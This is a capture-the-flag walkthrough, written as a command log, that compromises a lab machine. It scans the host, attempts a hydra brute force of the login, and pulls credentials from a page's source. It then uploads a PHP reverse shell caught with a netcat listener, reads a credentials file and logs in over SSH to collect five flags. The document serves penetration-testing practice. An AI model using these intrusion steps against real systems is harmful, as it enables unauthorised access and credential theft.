$ sudo netdiscover -i wlp2s0

$ nmap -sV 192.168.1.6 -p- -T5 -Pn
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


there is a web server running on port 80  so go to http://192.168.1.6

it redirects to login.php

go to  http://192.168.1.6/robots.txt

User-agent: *
Disallow: /
Disallow: /backup
Disallow: /admin
Disallow: /admin_area
Disallow: /r00t
Disallow: /uploads
Disallow: /uploaded_files
Disallow: /flag

go to /flag

so first flag is right there 
The 1st flag is : {8734509128730458630012095}



now go to the login page

there is username adn password fields

I will use hydra to bruteforce this form

https://olinux.net/brute-force-attack-login-form/
this is a nice article about how to bruteforce login pages with hydra


hydra -L /home/cihan/Desktop/user -P /home/cihan/Desktop/Me/SecLists/Passwords/darkweb2017-top10000.txt  192.168.1.9 http-post-form  "/check_login.php:user_name=^USER^&pass_word=^PASS^:Error in username/password" -V

this one didint work , so I decided to dig deeper.

lets start with /admin

nope not a valid url

go to /admin_area

look at the source page

username : admin
	password : 3v1l_H@ck3r
	The 2nd flag is : {7412574125871236547895214}
	
found username pass and 2. flag


lets login , and there is a file upload page

and there is also /uploaded_files directory

we maybe upload a shell and execute it later while browing /uploaded_files

first start a listener on the server
$ nc -lnvp 4444
I uploaded a shell.php file and late go to http://192.168.1.6/uploaded_files/shell.php


now we got the shell

after a little bit diggin I found the 3. flag in the /var/www/html directory and it
was in a file called hint.txt

try to find user technawi password to read the flag.txt file, you can find it in a hidden file ;)

The 3rd flag is : {7645110034526579012345670}

lets find the file 

$ find / -type f -user technawi

/etc/mysql/conf.d/credentials.txt
/var/www/html/flag.txt
/home/technawi/.bash_history
/home/technawi/.sudo_as_admin_successful
/home/technawi/.profile
/home/technawi/.bashrc
/home/technawi/.bash_logout

$ cat /etc/mysql/conf.d/credentials.txt
lets read this file
The 4th flag is : {7845658974123568974185412}

username : technawi
password : 3vilH@ksor

$ ssh -l technawi 192.168.1.6


$ cd /var/www/html
$ cat flag.txt

The 5th flag is : {5473215946785213456975249}

Good job :)

You find 5 flags and got their points and finish the first scenario....
